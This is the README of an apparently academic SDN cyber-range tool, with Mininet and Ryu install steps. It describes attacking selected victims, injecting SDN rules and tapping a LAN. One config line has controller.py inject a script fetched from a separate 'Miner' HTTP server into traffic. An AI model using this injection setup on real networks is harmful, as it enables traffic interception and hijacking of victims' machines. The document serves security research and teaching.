# SDNcybeRangeKit

A penetration testing and digital forensics environment 

**Warning: this [PRIVATE] project is for academic/research purposes only.**
@inproceedings{DBLP:conf/itasec/LetteriRCC18,
  author    = {Ivan Letteri and
               Massimo Del Rosso and
               Pasquale Caianiello and
               Dajana Cassioli},
  title     = {Performance of Botnet Detection by Neural Networks in Software-Defined
               Networks},
  booktitle = {Proceedings of the Second Italian Conference on Cyber Security, Milan,
               Italy, February 6th - to - 9th, 2018.},
  year      = {2018},
  crossref  = {DBLP:conf/itasec/2018},
  url       = {http://ceur-ws.org/Vol-2058/paper-03.pdf},
  timestamp = {Tue, 28 May 2019 16:23:34 +0200},
  biburl    = {https://dblp.org/rec/bib/conf/itasec/LetteriRCC18},
  bibsource = {dblp computer science bibliography, https://dblp.org}
}

A blog post about this project can be read here:  https://www.ivanletteri.it/2019/09/29/performance-of-botnet-detection-by-neural-networks-in-software-defined-networks/

![SDNcyberRangeKit]( https://www.ivanletteri.it/2019/02/10/sdncrkit/master/sdncrkit-logo-small.png "SDNcybeRangeKit")

INSTALL MININET

git clone git://github.com/mininet/mininet
cd mininet/
mininet/util/install.sh -nfv
sudo mn --test pingall
sudo apt-get install net-tools
sudo mn --test pingall

INSTALL PIP and PIP3

sudo apt install python-pip
sudo apt install python3-pip

INSTALL RYU Controller 

git clone git://github.com/osrg/ryu.git
cd ryu; pip install .
ls
./run_tests.sh 
cd ..
sudo apt install gcc python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev zlib1g-dev
cd ryu/
ls
cd bin/
ls
./ryu-manager ../ryu/app/simple_switch_13.py 

INSTALL NMAP for testing

sudo apt-get install nmap
cd ryu/
ls
./run_tests.sh 
ryu-manager ../ryu/app/simple_switch_13.py

nmap 127.0.0.1 -p-

START Mininet with Remote Ryu Controller

sudo mn --controller=remote,ip=127.0.0.1,port=6633


## Concept
- Performs a SDN scenario attacks to all selected victims
- Injects SDN rules 
- Tapping the network
- All the devices victims connected to the Lan network, will be monitored for the SDNcybeRangeMonitor


## Use
- install.sh
```
bash install.sh
```
- edit hosts.txt with one IP per line
- edit controller.py, line 30, with the RyuControlleMiner httpserver IP:
```py
os.system("~/.local/bin/flowdump -s 'dump.py http://10.0.2.20:5600/script.js' -T")
```
- execute sdn-cyberange-kit.py
```
python3 sdn-cyberange-kit.py ipgateway
```

![network](https://www.ivanletteri.it/2019/02/10/sdncrkit/master/SDNcybeRangeKit-network-attack.png "network")


A complete instructions for academic scenario can be found in https://github.com/IvanLetteri/SDNcybeRangeKit/blob/master/virtualbox_scenario_instructions.md



![demo](https://www.ivanletteri.it/2019/02/10/sdncrkit/master/SDNcybeRangeKit-demo-cutted.gif "demo")
